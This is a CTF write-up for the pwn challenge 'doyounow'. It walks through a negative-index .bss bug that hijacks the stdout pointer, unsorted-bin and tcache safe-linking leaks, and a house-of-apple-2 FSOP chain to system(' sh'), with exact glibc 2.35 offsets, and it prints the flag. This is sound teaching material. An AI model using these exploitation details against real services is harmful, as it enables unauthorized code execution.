# doyounow

**Event:** October 2026 SkillBit Flash CTF
**Category:** pwn
**Flag:** `SkillBit{simplememoryheresimplememorytheregivesoverflow}`

---

Service: TCP (TLS-wrapped) - doyounow @ *.live.sbhost.io:1337

## 1. Recon

`doyounow.zip` ships:
- `chal/chall.c` - source
- `chal/challenge` - PIE ELF, dynamically linked (glibc 2.35-0ubuntu3.13 per the image's libc.so.6)
- `chal/Dockerfile`, `entrypoint.sh` - socat `TCP-LISTEN:8080,fork EXEC:/app/challenge`
- flag at `/app/flag.txt` (env `FLAG`)

Protections: PIE, NX, full RELRO on the binary (GNU_RELRO covers 0x3d58..0x4000, so `.got` is read-only).

Note: the sbhost endpoint speaks TLS, not raw TCP. A plain-TCP connect returns a Go `404 page not found`; you must connect with TLS (SNI `*.live.sbhost.io`) to reach the container. In pwntools: `remote(host, port, ssl=True)`.

## 2. Program

Global `struct notes { char *chunk; uint size; } Notes[0x20];` at .bss `0x4080`.
Menu: 1 add, 2 delete, 3 edit, 4 show, 5 forge.

Every handler takes an index from `read_num()` (4-byte read -> `atoll`) with **no bounds check**:

- `add_notes()`: `Notes[index].chunk = malloc(size); Notes[index].size = size;`
- `delete_notes()`: `free(Notes[index].chunk); Notes[index].chunk = 0;`
- `edit_notes()`: `read(STDIN, Notes[index].chunk, Notes[index].size);`
- `show_notes()`: `unsigned index = read_num(); puts(Notes[index].chunk);` - truncated to 32-bit unsigned, so **negative indices crash here** (0xFFFFFFEE*16 -> unmapped). Only add/edit/delete reach below the array.
- `forge_notes()`: once-only (`COUNTER` guard) random `memcpy` - a decoy.

## 3. The bug - negative index into .bss

`.bss` layout (PIE-relative):

```
0x4020  stdout:  <+8>                (COPY reloc, points at _IO_2_1_stdout_)
0x4028  (pad)
0x4030  stdin
0x4040  stderr
0x4060  num[8]
0x4080  Notes[0x20]      (16 bytes/entry: chunk@+0, size@+8)
```

`Notes[-6]` maps to bss `0x4020`, i.e. the **`stdout` pointer itself**, and `Notes[-6].size` to `0x4028`.

So:
- `add_notes(-6, sz)` -> `stdout = malloc(sz)` (and `Notes[-6].size = sz`)
- `edit_notes(-6, data)` -> writes `sz` bytes **into that chunk**, i.e. we fully control the process's `stdout` FILE.

Because `.got` is RELRO-read-only, hijacking `stdout` (a writable COPY reloc) is the intended primitive.

## 4. Leaks

libc - unsorted bin reuse:
```
add(0,0x500); add(1,0x20)   # guard so the big chunk isn't top-adjacent
delete(0);   add(2,0x500)   # realloc from unsorted, fd/bk untouched
show(2) -> fd = main_arena+0x60
libc_base = leak - 0x21ace0
```

heap - tcache safe-linking:
```
add(3,0x400); edit(3,benign); delete(3)   # one entry in tcache[0x410], next=NULL
add(4,0x400)                              # pops it, leaves the safe-linked fd
show(4) -> fd = chunk>>12
T = (leak<<12) | 0x7e0        # low 12 bits are deterministic for this alloc sequence
```

## 5. FSOP - house of apple 2

`_IO_FILE` offsets used (glibc 2.35 x86-64):
| field | off |
|---|---|
| _flags | 0x00 |
| _IO_write_base / _ptr / _end | 0x20 / 0x28 / 0x30 |
| _IO_buf_base / _end | 0x38 / 0x40 |
| _fileno | 0x70 |
| _vtable_offset | 0x82 |
| _lock | 0x88 |
| _wide_data | 0xa0 |
| _mode | 0xc0 |
| vtable | 0xd8 |

_IO_wide_data: `_IO_write_base` 0x18, `_wide_vtable` **0xe0**; `_IO_jump_t.__doallocate` at +0x68.

Fake FILE placed in the hijacked chunk `T`:
- `T+0x00` = `" sh\0"`  (also `_flags`; see pitfall below)
- `T+0xa0` = `T+0x20`   (`_wide_data` -> into the chunk itself)
- `T+0xd8` = `_IO_wfile_jumps`
- `T+0x100` = `T+0x100` (`_wide_data->_wide_vtable` at `wide+0xe0`)
- `T+0x168` = `system`  (`_wide_vtable->__doallocate`)
- everything else zero

Trigger (the program's own `puts`):
`puts -> _IO_sputn -> _IO_wfile_xsputn -> _IO_wdefault_xsputn -> _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE(fp) = wide_vtable->__doallocate(fp) = system(fp)`, and `fp` bytes start with `" sh"`.

Chain: `add(3,0x400); edit(3,benign); delete(3); add(4,0x400) [leak]; show(4); delete(4); add(-6,0x400) -> stdout=T; edit(-6, mal)` -> shell.

## 6. Pitfalls hit (worth remembering)

1. **0x18 is `_IO_read_base`, not write_base.** Using it makes `_IO_file_xsputn` write through a NULL `_IO_write_ptr` -> SIGSEGV. Correct: write_base 0x20.
2. **A freed chunk's first 16 bytes get clobbered** by the allocator (tcache next/key, or unsorted fd/bk). To survive the intermittent `puts("added!")` right after the hijack, pre-seed the chunk with a benign FILE and use a **tcache-sized** chunk with an **empty bin** so `_flags` ends up 0.
3. **`"sh"` as the command sets `_IO_UNBUFFERED`** (flags bit1 = 0x2 on 's'=0x73), sending `_IO_wdoallocbuf` down the `_IO_wdefault_doallocate` branch instead of calling our `__doallocate`. Use `" sh"` (leading 0x20) -> flags treat it as buffered.
4. **Fake scratch must be in mapped memory.** libc's anon RW extension (inside the final LOAD's `p_memsz`, base+0x21c000..~0x22b560) is writable and at a known offset; anything past it is unmapped. Here the fake wide_data/vtable are placed *inside the hijacked heap chunk* to avoid needing scratch in libc at all.
5. **The endpoint is TLS.** Plain TCP gets a Go 404; use `ssl=True`.

## 7. Flag

SkillBit{simplememoryheresimplememorytheregivesoverflow}
